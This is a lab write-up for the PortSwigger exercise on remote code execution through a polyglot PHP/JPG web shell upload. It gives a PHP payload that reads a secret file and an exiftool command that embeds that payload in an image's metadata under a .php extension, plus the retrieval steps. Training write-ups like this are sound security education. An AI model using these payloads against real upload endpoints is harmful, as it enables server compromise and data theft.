# Remote code execution via polyglot web shell upload

## Description

[This lab](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload) contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code. 

## Reproduction and proof of concept

1. On your system, create a file called ``exploit.php`` containing a script for fetching the contents of Carlos's secret. For example:

```text
<?php echo file_get_contents('/home/carlos/secret'); ?> 
```

2. Log in and attempt to upload the script as your avatar. 

```text
Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.

ï¿½ Back to My Account
```

The server successfully blocks uploading files that are not images, even if you try using techniques used in previous labs.

3. Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:

```text
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" nina.jpg -o polyglot.php
```

This adds the PHP payload to the image's Comment field, then saves the image with a `.php` extension. 

4. In your browser, upload the polyglot image as your avatar, then go back to your account page. 
5. In Burp's proxy history, find the `GET /files/avatars/polyglot.php` request. Use the message editor's search feature to find the `START` string somewhere within the binary image data in the response. Between this and the ``END`` string, you should see Carlos's secret:

![File upload](/_static/images/upload8.png)

6. Submit the secret to solve the lab. 

## Exploitability

An attacker will need to log in; upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`; and then enter this secret using the button provided in the lab banner.
